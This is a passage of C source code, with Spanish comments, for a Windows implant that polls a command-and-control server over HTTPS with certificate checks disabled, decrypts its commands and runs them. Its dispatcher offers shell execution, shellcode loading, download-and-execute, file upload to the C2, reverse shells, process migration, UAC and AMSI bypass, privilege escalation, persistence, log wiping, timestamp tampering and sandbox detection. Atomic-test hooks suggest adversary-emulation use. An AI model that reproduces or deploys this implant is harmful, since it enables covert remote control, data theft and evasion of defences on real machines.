            WINHTTP_NO_PROXY_NAME,
            WINHTTP_NO_PROXY_BYPASS,
            0);
        if (!hSession) {
            printf("[-] Error creando sesión WinHTTP\n");
            fflush(stdout);
            Sleep(1000);
            continue;
        }

        // Parse URL - mejorado para manejar https/http
        char host[256], path[512];
        int port = 443; // Default HTTPS
        const char* host_start = url;
        
        if (strstr(url, "https://")) {
            host_start = url + 8;
            port = 443;
        } else if (strstr(url, "http://")) {
            host_start = url + 7;
            port = 80;
        }
        
        const char* path_start = strchr(host_start, '/');
        const char* port_start = strchr(host_start, ':');
        
        if (port_start && (!path_start || port_start < path_start)) {
            // Hay puerto especificado
            int host_len = port_start - host_start;
            strncpy(host, host_start, host_len);
            host[host_len] = '\0';
            port = atoi(port_start + 1);
            if (path_start) {
                strcpy(path, path_start);
            } else {
                strcpy(path, "/");
            }
        } else if (path_start) {
            int host_len = path_start - host_start;
            strncpy(host, host_start, host_len);
            host[host_len] = '\0';
            strcpy(path, path_start);
        } else {
            strcpy(host, host_start);
            strcpy(path, "/");
        }

        printf("[D] Host: %s, Puerto: %d, Path: %s\n", host, port, path);
        fflush(stdout);

        HINTERNET hConnect = WinHttpConnect(hSession, UTF8ToWide(host), port, 0);
        if (!hConnect) {
            printf("[-] Error conectando a %s:%d\n", host, port);
            fflush(stdout);
            WinHttpCloseHandle(hSession);
            Sleep(1000);
            continue;
        }

        DWORD request_flags = 0;
        if (port == 443 || strstr(url, "https://")) {
            request_flags = WINHTTP_FLAG_SECURE;
        }

        HINTERNET hRequest = WinHttpOpenRequest(hConnect,
            UTF8ToWide(method),
            UTF8ToWide(path),
            NULL,
            WINHTTP_NO_REFERER,
            WINHTTP_DEFAULT_ACCEPT_TYPES,
            request_flags);

        if (!hRequest) {
            printf("[-] Error creando request\n");
            fflush(stdout);
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            Sleep(1000);
            continue;
        }

        // Configurar flags de seguridad para HTTPS
        if (request_flags & WINHTTP_FLAG_SECURE) {
            DWORD flags = SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                          SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                          SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                          SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;

            if (!WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags))) {
                printf("[-] Error configurando flags SSL\n");
                fflush(stdout);
            }
        }

        // Añadir headers
        BOOL headers_ok = TRUE;
        if (data && strlen(data) > 0) {
            if (!WinHttpAddRequestHeaders(hRequest,
                L"Content-Type: application/octet-stream\r\n",
                -1,
                WINHTTP_ADDREQ_FLAG_REPLACE | WINHTTP_ADDREQ_FLAG_ADD)) {
                DWORD err = GetLastError(); 
                printf("[-] Failed to add Content-Type, Error: %lu\n", err);
                fflush(stdout);
                headers_ok = FALSE;
            }
            printf("[D] Primeros 20 bytes del cuerpo: %.*s\n", 
                   (int)(strlen(data) > 20 ? 20 : strlen(data)), data);
            fflush(stdout);
        }

        if (!headers_ok) {
            WinHttpCloseHandle(hRequest);
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            Sleep(1000);
            continue;
        }

        // Enviar solicitud
        DWORD data_length = data ? strlen(data) : 0;
        BOOL sent = WinHttpSendRequest(hRequest,
            WINHTTP_NO_ADDITIONAL_HEADERS, 0,
            (void*)data, data_length,
            data_length, 0);

        if (!sent) {
            DWORD error = GetLastError();
            printf("[-] WinHttpSendRequest falló, Código: %lu\n", error);
            switch(error) {
                case ERROR_WINHTTP_SECURE_FAILURE:       
                    printf("   -> Fallo SSL\n"); 
                    break;
                case ERROR_NOT_ENOUGH_MEMORY:            
                    printf("   -> Memoria insuficiente\n"); 
                    break;
                case ERROR_INVALID_PARAMETER:            
                    printf("   -> Parámetro inválido\n"); 
                    break;
                case ERROR_WINHTTP_CANNOT_CONNECT:
                    printf("   -> No se puede conectar al servidor\n");
                    break;
                case ERROR_WINHTTP_TIMEOUT:
                    printf("   -> Timeout de conexión\n");
                    break;
                case ERROR_WINHTTP_NAME_NOT_RESOLVED:
                    printf("   -> No se pudo resolver el nombre del host\n");
                    break;
                case 12030: // ERROR_INTERNET_CONNECTION_ABORTED
                    printf("   -> Conexión abortada\n");
                    break;
                default: 
                    printf("   -> Error desconocido: %lu\n", error);
            }
            fflush(stdout);
            WinHttpCloseHandle(hRequest);
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            Sleep(1000);
            continue;
        }

        if (!WinHttpReceiveResponse(hRequest, NULL)) {
            DWORD error = GetLastError();
            printf("[-] WinHttpReceiveResponse failed, Error: %lu\n", error);
            fflush(stdout);
            WinHttpCloseHandle(hRequest);
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            Sleep(1000);
            continue;
        }

        // Obtener código de estado HTTP
        DWORD statusCode = 0;
        DWORD statusCodeSize = sizeof(statusCode);
        if (WinHttpQueryHeaders(hRequest,
            WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
            NULL, &statusCode, &statusCodeSize, NULL)) {
            printf("[+] Código de estado HTTP: %lu\n", statusCode);
            fflush(stdout);
        }

        // Leer respuesta
        char* response = NULL;
        DWORD totalSize = 0;
        DWORD bytesRead;
        char chunk[4096];

        do {
            if (!WinHttpReadData(hRequest, chunk, sizeof(chunk) - 1, &bytesRead)) {
                printf("[-] Error leyendo datos\n");
                fflush(stdout);
                break;
            }
            if (bytesRead == 0) break;
            
            char* newBuffer = realloc(response, totalSize + bytesRead + 1);
            if (!newBuffer) {
                printf("[-] Error realocando memoria\n");
                fflush(stdout);
                if (response) free(response);
                response = NULL;
                break;
            }
            response = newBuffer;
            memcpy(response + totalSize, chunk, bytesRead);
            totalSize += bytesRead;
        } while (bytesRead > 0);

        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);

        if (response) {
            response[totalSize] = '\0';
            printf("[+] Respuesta recibida (%lu bytes)\n", totalSize);
            printf("[D] Primeros 100 bytes de respuesta: %.*s\n", 
                   (int)(totalSize > 100 ? 100 : totalSize), response);
            fflush(stdout);
            return response; // Éxito!
        } else {
            printf("[-] No se pudo leer la respuesta en intento %d\n", attempt + 1);
            fflush(stdout);
        }
        
        if (attempt < max_retries - 1) {
            printf("[*] Reintentando en 1 segundo...\n");
            fflush(stdout);
            Sleep(1000);
        }
    }

    printf("[-] Todos los intentos fallaron\n");
    fflush(stdout);
    return NULL;
}

// exec_cmd.c
char* exec_cmd(const char* cmd) {
    printf("[*] exec_cmd...\n");
    fflush(stdout);
    FILE* fp = _popen(cmd, "r");
    if (!fp) return NULL;

    char* output = NULL;
    size_t size = 0;
    char buffer[4096];
    while (fgets(buffer, sizeof(buffer), fp)) {
        size_t len = strlen(buffer);
        char* newOut = realloc(output, size + len + 1);
        if (newOut) {
            output = newOut;
            strcpy(output + size, buffer);
            size += len;
        }
    }
    _pclose(fp);
    return output;
}


// =================================================================================================
// C2 Communication & File Download
// =================================================================================================

// c2.c (reemplaza la función actual)
char* GetC2Command(const char* host, const char* path) {
    printf("[*] getc2command...\n");
    fflush(stdout);

    HINTERNET hSession = WinHttpOpen(
        USER_AGENT,
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0
    );
    if (!hSession) {
        DWORD err = GetLastError();
        printf("[-] WinHttpOpen failed, Error: %lu\n", err);
        fflush(stdout);
        return NULL;
    }

    HINTERNET hConnect = WinHttpConnect(hSession, LC2_HOST, C2_PORT, 0);
    if (!hConnect) {
        DWORD err = GetLastError();
        printf("[-] WinHttpConnect failed, Error: %lu\n", err);
        WinHttpCloseHandle(hSession);
        return NULL;
    }

    HINTERNET hRequest = WinHttpOpenRequest(
        hConnect,
        L"GET",
        LC2_PATH,
        NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        WINHTTP_FLAG_SECURE
    );
    if (!hRequest) {
        DWORD err = GetLastError();
        printf("[-] WinHttpOpenRequest failed, Error: %lu\n", err);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return NULL;
    }

    // Ignorar errores de certificado
    DWORD flags = SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                  SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                  SECURITY_FLAG_IGNORE_UNKNOWN_CA;
    if (!WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags))) {
        DWORD err = GetLastError();
        printf("[-] WinHttpSetOption failed, Error: %lu\n", err);
    }

    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
        DWORD err = GetLastError();
        printf("[-] WinHttpSendRequest failed, Error: %lu\n", err);
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return NULL;
    }

    if (!WinHttpReceiveResponse(hRequest, NULL)) {
        DWORD err = GetLastError();
        printf("[-] WinHttpReceiveResponse failed, Error: %lu\n", err);
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return NULL;
    }

    char* b64_response = NULL;
    DWORD totalSize = 0;
    DWORD bytesRead;
    char chunk[4096];

    do {
        if (!WinHttpReadData(hRequest, chunk, sizeof(chunk) - 1, &bytesRead)) {
            DWORD err = GetLastError();
            printf("[-] WinHttpReadData failed, Error: %lu\n", err);
            break;
        }
        if (bytesRead == 0) break;
        char* newBuffer = realloc(b64_response, totalSize + bytesRead + 1);
        if (!newBuffer) break;
        b64_response = newBuffer;
        memcpy(b64_response + totalSize, chunk, bytesRead);
        totalSize += bytesRead;
    } while (bytesRead > 0);

    if (b64_response) b64_response[totalSize] = '\0';

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    
    printf("[+] Received %lu bytes (b64): %.*s\n", totalSize, min(totalSize, 64), b64_response);
    fflush(stdout);

    if (!b64_response || totalSize == 0) {
        printf("[-] Empty or no response from C2\n");
        fflush(stdout);
        free(b64_response);
        return NULL;
    }

    printf("[+] Received %lu bytes (b64): %.*s\n", totalSize, min(totalSize, 64), b64_response);

    size_t decoded_len;
    BYTE* decoded_data = (BYTE*)base64_decode(b64_response, &decoded_len);
    free(b64_response);
    if (!decoded_data || decoded_len == 0) {
        printf("[-] base64_decode failed\n");
        fflush(stdout);
        return NULL;
    }

    printf("[D] Decoded len: %zu\n", decoded_len);
    fflush(stdout);

    if (!DecryptPacket(decoded_data, (DWORD*)&decoded_len)) {
        printf("[-] DecryptPacket failed\n");
        fflush(stdout);
        free(decoded_data);
        return NULL;
    }

    for (int i = 0; i < decoded_len; i++) {
        if (decoded_data[i] == '\0') {
            printf("[-] Null byte in middle of command at pos %d\n", i);
            fflush(stdout);
            free(decoded_data);
            return NULL;
        }
    }

    char* command = (char*)malloc(decoded_len + 1);
    if (command) {
        memcpy(command, decoded_data, decoded_len);
        command[decoded_len] = '\0';
        printf("[+] Decrypted command: '%s'\n", command);
        fflush(stdout);
    }
    free(decoded_data);

    return command;
}

unsigned char* DownloadToBuffer(const char* url, DWORD* fileSize) {
    *fileSize = 0; 

    HINTERNET hSession = WinHttpOpen(
        USER_AGENT,
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0
    );
    if (!hSession) return NULL;

    // ----- parsear URL -----
    char host[256] = {0};
    char path[512] = {0};
    const char* host_start = strstr(url, "://");
    host_start = host_start ? host_start + 3 : url;
    const char* path_start = strchr(host_start, '/');
    if (path_start) {
        strncpy(host, host_start, path_start - host_start);
        strncpy(path, path_start, sizeof(path) - 1);
    } else {
        strncpy(host, host_start, sizeof(host) - 1);
        strcpy(path, "/");
    }

    // ----- conectar -----
    HINTERNET hConnect = WinHttpConnect(hSession, UTF8ToWide(host), 443, 0);
    if (!hConnect) goto cleanup_session;

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", UTF8ToWide(path),
                                            NULL, WINHTTP_NO_REFERER,
                                            WINHTTP_DEFAULT_ACCEPT_TYPES,
                                            WINHTTP_FLAG_SECURE);
    if (!hRequest) goto cleanup_connect;

    DWORD flags = SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                  SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                  SECURITY_FLAG_IGNORE_UNKNOWN_CA;
    WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags));

    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                            WINHTTP_NO_REQUEST_DATA, 0, 0, 0))
        goto cleanup_request;

    if (!WinHttpReceiveResponse(hRequest, NULL))
        goto cleanup_request;

    // ----- leer respuesta -----
    unsigned char* buffer = NULL;
    DWORD total = 0, bytesRead = 0;
    BYTE tmp[8192];

    while (WinHttpReadData(hRequest, tmp, sizeof(tmp), &bytesRead) && bytesRead) {
        unsigned char* newBuf = realloc(buffer, total + bytesRead);
        if (!newBuf) {
            free(buffer);
            buffer = NULL;
            goto cleanup_request;
        }
        buffer = newBuf;
        memcpy(buffer + total, tmp, bytesRead);
        total += bytesRead;
    }

    *fileSize = total;

cleanup_request:
    WinHttpCloseHandle(hRequest);
cleanup_connect:
    WinHttpCloseHandle(hConnect);
cleanup_session:
    WinHttpCloseHandle(hSession);
    return buffer;
}

BOOL DownloadFromURL(const char* url, const char* filepath) {
    printf("[*] Downloading from external URL: %s -> %s\n", url, filepath);
    fflush(stdout);

    // Hacer GET sin autenticación ni cifrado (es externo)
    char* response = retry_http_request(url, "GET", NULL, MAX_RETRIES);
    if (!response || strlen(response) == 0) {
        printf("[-] Failed to download from URL\n");
        fflush(stdout);
        return FALSE;
    }

    FILE* fp = fopen(filepath, "wb");
    if (!fp) {
        printf("[-] Cannot open %s for writing\n", filepath);
        fflush(stdout);
        free(response);
        return FALSE;
    }

    size_t len = strlen(response);
    fwrite(response, 1, len, fp);
    fclose(fp);
    free(response);

    printf("[+] File saved: %s\n", filepath);
    fflush(stdout);
    return TRUE;
}


char* encrypt_data(const char* data) {
    if (!data) return NULL;

    int data_len = strlen(data);
    BYTE* iv = malloc(16);
    BYTE* encrypted_data = malloc(16 + data_len);
    if (!iv || !encrypted_data) {
        if (iv) free(iv);
        if (encrypted_data) free(encrypted_data);
        return NULL;
    }

    // Generar IV aleatorio
    HCRYPTPROV hProv;
    if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        free(iv);
        free(encrypted_data);
        return NULL;
    }
    CryptGenRandom(hProv, 16, iv);
    CryptReleaseContext(hProv, 0);

    // Copiar IV + data
    memcpy(encrypted_data, iv, 16);
    memcpy(encrypted_data + 16, data, data_len);

    // Inicializar AES
    struct AES_ctx ctx;
    AES_init_ctx(&ctx, aes_key);

    // CFB 128-bit: cifrar en bloques de 16 bytes
    BYTE feedback[16];
    memcpy(feedback, iv, 16);

    for (int i = 0; i < data_len; i += 16) {
        BYTE block[16];
        int block_size = (data_len - i < 16) ? (data_len - i) : 16;

        // Cifrar el feedback para obtener keystream
        memcpy(block, feedback, 16);
        AES_ECB_encrypt(&ctx, block);

        // XOR con el plaintext
        for (int j = 0; j < block_size; j++) {
            encrypted_data[16 + i + j] ^= block[j];
        }

        // Actualizar feedback con el ciphertext (16 bytes)
        memcpy(feedback, &encrypted_data[16 + i], 16);
    }

    // Codificar en Base64
    char* b64 = base64_encode(encrypted_data, 16 + data_len);
    free(iv);
    free(encrypted_data);
    return b64;
}

BOOL isValidUUID(const char* uuid) {
    if (strlen(uuid) != 36) return FALSE;
    
    for (int i = 0; i < 36; i++) {
        if (i == 8 || i == 13 || i == 18 || i == 23) {
            if (uuid[i] != '-') return FALSE;
        } else {
            if (!isxdigit(uuid[i])) return FALSE;
        }
    }
    
    // Verificar versión (debe ser 4)
    if (uuid[14] != '4') return FALSE;
    
    // Verificar variant (debe ser 8, 9, A o B)
    char variant = uuid[19];
    if (variant != '8' && variant != '9' && 
        variant != 'A' && variant != 'a' && 
        variant != 'B' && variant != 'b') {
        return FALSE;
    }
    
    return TRUE;
}

void deleteFilesDelay(void* arg) {
    char** files = (char**)arg;
    Sleep(65000); // Esperar 65 segundos (mismo timeout que Go)
    if (files[0]) {
        DeleteFileA(files[0]);
        free(files[0]);
    }
    if (files[1]) {
        DeleteFileA(files[1]);
        free(files[1]);
    }
    free(files);
}

void executeCommand(void* cmdPtr) {
    char* cmd = (char*)cmdPtr;
    if (cmd) {
        system(cmd);
        free(cmd);
    }
    _endthread();
}

void handleAtomic(char* command) {
    printf("[*] Handling atomic test: %s\n", command);
    fflush(stdout);

    // Verificar modo sigiloso
    if (stealthModeEnabled) {
        printf("[DEBUG] Stealth mode active. Skipping atomic test.\n");
        fflush(stdout);
        return;
    }

    // Extraer idAtomic
    const char* idAtomic = command + strlen("adversary:");
    if (!idAtomic || strlen(idAtomic) != 36) {
        printf("[-] Invalid id_atomic: %s\n", idAtomic ? idAtomic : "(null)");
        fflush(stdout);
        return;
    }

    // Validar UUID (formato básico)
    if (!isValidUUID(idAtomic)) {
        printf("[-] Invalid UUID format: %s\n", idAtomic);
        fflush(stdout);
        return;
    }

    char scriptName[64];
    char scriptPath[MAX_PATH];
    char cleanScriptName[64];
    char cleanScriptPath[MAX_PATH];

    // Construir nombres
    snprintf(scriptName, sizeof(scriptName), "atomic_test_%s.ps1", idAtomic);
    snprintf(cleanScriptName, sizeof(cleanScriptName), "atomic_clean_test_%s.ps1", idAtomic);

    // Obtener directorio actual
    if (!GetCurrentDirectoryA(MAX_PATH, scriptPath)) {
        printf("[-] Failed to get current directory\n");
        return;
    }
    int len = strlen(scriptPath);
    if (len > 0 && scriptPath[len-1] != '\\\\' && scriptPath[len-1] != '/') {
        strcat(scriptPath, "\\\\");
    }
    strcat(scriptPath, scriptName);

    // Limpiar script va a /temp
    GetTempPathA(MAX_PATH, cleanScriptPath);
    len = strlen(cleanScriptPath);
    if (len > 0 && cleanScriptPath[len - 1] != '\\\\' && cleanScriptPath[len - 1] != '/') {
        strcat(cleanScriptPath, "\\\\");
    }
    strcat(cleanScriptPath, cleanScriptName);

    // === 1. Descargar y ejecutar test script ===
    char downloadUrl[512];
    snprintf(downloadUrl, sizeof(downloadUrl), "%s%s/download/%s", C2_URL, MALEABLE, scriptName);

    printf("[*] Downloading test script: %s\n", downloadUrl);
    fflush(stdout);

    if (!DownloadFromURL(downloadUrl, scriptPath)) {
        printf("[-] Failed to download test script: %s\n", scriptName);
        fflush(stdout);
        return;
    }

    // Ofuscar timestamps
    obfuscateFileTimestamp(scriptPath);

    // Ejecutar: powershell -Command .\atomic_test_*.ps1
    char cmd[MAX_PATH];
    snprintf(cmd, sizeof(cmd), "powershell -Command .\\\\%s", scriptName);

    printf("[*] Executing test script: %s\n", cmd);
    fflush(stdout);

    // Ejecutar en hilo separado
    uintptr_t thread = _beginthread(executeCommand, 0, _strdup(cmd));
    if (thread == -1L) {
        printf("[-] Failed to start test script thread\n");
        fflush(stdout);
    }

    // === 2. Descargar y ejecutar cleanup script (opcional) ===
    snprintf(downloadUrl, sizeof(downloadUrl), "%s%s/download/%s", C2_URL, MALEABLE, cleanScriptName);

    printf("[*] Attempting to download cleanup script: %s\n", downloadUrl);
    fflush(stdout);

    if (DownloadFromURL(downloadUrl, cleanScriptPath)) {
        obfuscateFileTimestamp(cleanScriptPath);

        char cleanCmd[MAX_PATH];
        snprintf(cleanCmd, sizeof(cleanCmd), "powershell -Command .\\%s", cleanScriptName);

        printf("[*] Executing cleanup script: %s\n", cleanCmd);
        fflush(stdout);

        uintptr_t cleanThread = _beginthread(executeCommand, 0, _strdup(cleanCmd));
        if (cleanThread == -1L) {
            printf("[-] Failed to start cleanup script thread\n");
            fflush(stdout);
        }
    } else {
        printf("[D] Cleanup script not found or failed to download: %s\n", cleanScriptName);
        fflush(stdout);
    }

    // === 3. Programar eliminación de archivos ===
    char* filesToDelete[2] = { _strdup(scriptPath), _strdup(cleanScriptPath) };
    if (filesToDelete[0] && filesToDelete[1]) {
        _beginthread((void(*)(void*))deleteFilesDelay, 0, filesToDelete);
    } else {
        if (filesToDelete[0]) free(filesToDelete[0]);
        if (filesToDelete[1]) free(filesToDelete[1]);
    }

    printf("[+] Atomic test initiated for: %s\n", idAtomic);
    fflush(stdout);
}

// === handleDownload: descarga del C2 al beacon ===
BOOL handleDownload(const char* command) {
    const char* filename = command + 9;  // "download:"
    if (!filename || !strlen(filename)) return FALSE;

    char downloadUrl[512];
    snprintf(downloadUrl, sizeof(downloadUrl), "%s%s/download/%s", C2_URL, MALEABLE, filename);

    char localPath[MAX_PATH];
    GetTempPathA(MAX_PATH, localPath);
    strcat(localPath, filename);

    if (DownloadFromURL(downloadUrl, localPath)) {
        obfuscateFileTimestamp(localPath);
        printf("[+] Downloaded: %s", localPath);
        return TRUE;
    }
    printf("[-] Failed to download: %s", downloadUrl);
    return FALSE;
}

// Función principal de manejo de comandos
void handleAdversary(char* command) {
    printf("[*] Handling adversary command: %s\n", command);
    fflush(stdout);

    // --- Variables iniciales ---
    char output[8192] = {0};
    char error[1024] = {0};
    char id_atomic[37] = {0};
    char line[1024];
    size_t output_len = 0;
    char* hostname = GetHostname();
    char* ips = GetIPs();
    char* user = GetUsername();

    if (!hostname) hostname = strdup("unknown");
    if (!ips) ips = strdup("unknown");
    if (!user) user = strdup("unknown");

    if (strncmp(command, "stealth_off", 11) == 0) {
        stealthModeEnabled = 0;
        snprintf(output, sizeof(output), "Stealth mode disabled.");
        goto send_response;
    }

    if (strncmp(command, "stealth_on", 10) == 0) {
        stealthModeEnabled = 1;
        snprintf(output, sizeof(output), "Stealth mode enabled.");
        goto send_response;
    }

    // --- Stealth mode check ---
    if (stealthModeEnabled) {
        printf("[DEBUG] Stealth mode is active. Skipping command execution.\n");
        fflush(stdout);
        snprintf(error, sizeof(error), "Stealth mode active");
        goto send_response;
    }


    printf("[+] Command to execute: %s\n", command);
    fflush(stdout);

    // --- Comandos de control ---
    if (strncmp(command, "adversary:", 10) == 0) {
        handleAtomic(command);
        goto send_response;
    }



    if (strcmp(command, "selfdestruct") == 0 || strncmp(command, "terminate:", 10) == 0) {
        snprintf(output, sizeof(output), "Self-destruct initiated.");
        _beginthread((void(*)(void*))selfDestruct, 0, NULL);
        goto send_response;
    }

    if (strcmp(command, "restart:") == 0) {
        snprintf(output, sizeof(output), "Restarting client.");
        restartClient();
        goto send_response;
    }

    if (strcmp(command, "discover:") == 0) {
        discoverLocalHosts();
        snprintf(output, sizeof(output), "Network discovery completed. Hosts: %s", 
                discoveredLiveHosts ? discoveredLiveHosts : "none");
        goto send_response;
    }

    if (strcmp(command, "debug") == 0) {
        BOOL isDebug = checkDebuggers();
        snprintf(output, sizeof(output), "Debugger detected: %s", isDebug ? "yes" : "no");
        goto send_response;
    }

    if (strncmp(command, "isvm", 4) == 0) {
        if (isVMByMAC()) {
            snprintf(output, sizeof(output), "This is a VM");
        } else {
            snprintf(output, sizeof(output), "This is not a VM");
        }
        goto send_response;
    }

    if (strncmp(command, "sandbox", 7) == 0) {
        if (isSandboxEnvironment()) {
            snprintf(output, sizeof(output), "This is a sandbox environment");
        } else {
            snprintf(output, sizeof(output), "This is not a sandbox environment");
        }
        goto send_response;
    }
    if (strncmp(command, "persist:", 8) == 0) {
        if (ensurePersistence()) {
            snprintf(output, sizeof(output), "Persist works");
        } else {
            snprintf(output, sizeof(output), "Not Persist :(");
        }
        goto send_response;
    }
    if (strcmp(command, "amsi:") == 0) {
        if (patchAMSI()) {
            snprintf(output, sizeof(output), "AMSI bypass successful.");
        } else {
            snprintf(output, sizeof(output), "AMSI bypass failed.");
        }
        goto send_response;
    }

    if (strcmp(command, "privilege_escalation") == 0) {
        tryPrivilegeEscalation();
        snprintf(output, sizeof(output), "Privilege escalation attempted.");
        goto send_response;
    }

    if (strcmp(command, "info") == 0) {
        snprintf(output, sizeof(output),
            "Host: %s\nIPs: %s\nUser: %s\nArch: x64\nOS: Windows",
            hostname, ips, user);
        goto send_response;
    }

    // --- Comandos de ejecución remota ---
    if (strncmp(command, "shell:", 6) == 0) {
        char* cmd = command + 6;
        char* result = exec_cmd(cmd);
        if (result) {
            strncpy(output, result, sizeof(output) - 1);
            free(result);
        } else {
            strncpy(error, "Command execution failed", sizeof(error) - 1);
        }
        goto send_response;
    }

    if (strncmp(command, "shellcode:", 10) == 0) {
        char* url = _strdup(command + 10);
        if (!url) {
            printf("[-] executeLoader: _strdup failed\n");
            return;
        }

        HANDLE hThread = (HANDLE)_beginthreadex(NULL, 0, (unsigned int (__stdcall *)(void *))executeLoader, url, 0, NULL);
        if (hThread == NULL) {
            printf("[-] executeLoader: Failed to create thread\n");
            free(url);
        } else {
            printf("[+] executeLoader: Thread created, handle %p\n", hThread);
            CloseHandle(hThread);  // 🔥 Desacopla
        }
        snprintf(output, sizeof(output), "Shellcode loading: %s", command + 10);
        goto send_response;
    }

    if (strncmp(command, "upload:", 7) == 0) {
        const char* filePath = command + 7;
        if (!filePath || !strlen(filePath)) {
            printf("[-] Invalid upload command\n");
            goto send_response;
        }

        if (!FileExistsA(filePath)) {
            printf("[-] File not found: %s\n", filePath);
            goto send_response;
        }

        // === Usa la URL correcta ===
        char uploadUrl[512];
        snprintf(uploadUrl, sizeof(uploadUrl), "%s%s/upload", C2_URL, MALEABLE);

        if (UploadFileToC2(uploadUrl, filePath)) {
            printf("[+] Uploaded: %s\n", filePath);
            snprintf(output, sizeof(output), "Uploaded: %s", filePath);
        } else {
            printf("[-] Upload failed: %s\n", filePath);
            snprintf(error, sizeof(error), "Upload failed: %s", filePath);
        }
        goto send_response;
    }

    if (strncmp(command, "download_exec:", 14) == 0) {
        char* rest = command + 14;
        char* filepath = strtok(rest, ",");
        char* url = strtok(NULL, ",");

        if (url && filepath) {
            if (downloadAndExecute(url, filepath)) {
                snprintf(output, sizeof(output), "downloadAndExecute: %s -> %s", url, filepath);
            } else {
                snprintf(error, sizeof(error), "downloadAndExecute failed: %s", url);
            }
        } else {
            snprintf(error, sizeof(error), "Invalid format: download_exec:<target>,<url>");
        }
        goto send_response;
    }
    if (strncmp(command, "download:", 9) == 0) {
        if (handleDownload(command)) {
            snprintf(output, sizeof(output), "Downloaded: %s", command + 9);
        } else {
            snprintf(error, sizeof(error), "Download failed");
        }
        goto send_response;
    }

    if (strncmp(command, "rev:", 4) == 0) {
        char* host = strtok(command + 4, ":");
        char* port_str = strtok(NULL, ":");
        if (host && port_str) {
            ReverseArgs* args = (ReverseArgs*)malloc(sizeof(ReverseArgs));
            if (!args) {
                snprintf(error, sizeof(error), "Mem fail");
                goto send_response;
            }
            strncpy(args->host, host, 31);
            args->host[31] = '\0';
            args->port = atoi(port_str);

            // Lanza hilo desacoplado
            uintptr_t tid = _beginthread(ReverseShell, 0, args);
            if (tid == -1L) {
                free(args);
                snprintf(error, sizeof(error), "Thread fail");
            } else {
                snprintf(output, sizeof(output), "Reverse shell started: %s:%d (tid=%u)", host, args->port, (unsigned int)tid);
            }
        } else {
            snprintf(error, sizeof(error), "Invalid rev format");
        }
        goto send_response;
    }
    if (strncmp(command, "migrate:", 8) == 0) {
        char* rest = command + 8;
        char* target = strtok(rest, ",");
        char* payload = strtok(NULL, ",");

        if (target && payload) {
            overWrite(target, payload);
            snprintf(output, sizeof(output), "Migration to %s initiated", target);
        } else {
            snprintf(error, sizeof(error), "Usage: migrate:<target.exe>,<payload.exe|url>");
        }
        goto send_response;
    }

    // --- Persistencia y obfuscación ---
    if (strncmp(command, "uac_bypass:", 11) == 0) {
        const char* payload = command + 11;
        if (executeUACBypass(payload)) {
            snprintf(output, sizeof(output), "UAC bypass attempted successfully");
        } else {
            snprintf(error, sizeof(error), "UAC bypass failed");
        }
        goto send_response;
    }

    if (strncmp(command, "obfuscate:", 10) == 0) {
        char* path = command + 10;
        if (strlen(path) == 0) {
            snprintf(output, sizeof(output), "Error: No path specified");
            goto send_response;
        }
        obfuscateFileTimestamps(path, 0);
        snprintf(output, sizeof(output), "File timestamps obfuscated in %s", path);
        goto send_response;
    }

    if (strncmp(command, "cleanlogs", 9) == 0) {
        cleanSystemLogs();
        snprintf(output, sizeof(output), "System logs cleaned (attempted)");
        goto send_response;
    }

    // --- Red y proxy ---
    if (strncmp(command, "proxy:", 6) == 0) {
        char* arg = command + 6;
        char* listenAddr = strtok(arg, ":");
        char* listenPort = strtok(NULL, ":");
        char* targetAddr = strtok(NULL, ":");
        char* targetPort = strtok(NULL, ":");

        if (listenAddr && listenPort && targetAddr && targetPort) {
            char listen[64], target[64];
            snprintf(listen, sizeof(listen), "%s:%s", listenAddr, listenPort);
            snprintf(target, sizeof(target), "%s:%s", targetAddr, targetPort);
            startProxy(listen, target);
            snprintf(output, sizeof(output), "Proxy started: %s -> %s", listen, target);
        } else {
            snprintf(error, sizeof(error), "proxy: invalid format");
        }
        goto send_response;
    }

    if (strncmp(command, "stop_proxy:", 11) == 0) {
        char* listenAddr = command + 11;
        stopProxy(listenAddr);
        snprintf(output, sizeof(output), "Proxy stopped: %s", listenAddr);
        goto send_response;
    }

    // --- Escaneo ---
    if (strncmp(command, "portscan:", 9) == 0) {
        char* target = command + 9;
        if (strlen(target) == 0) {
            // Usa rhost por defecto si no especifica
            target = lazyconf.rhost;
        }

        // Usás los puertos de lazyconf
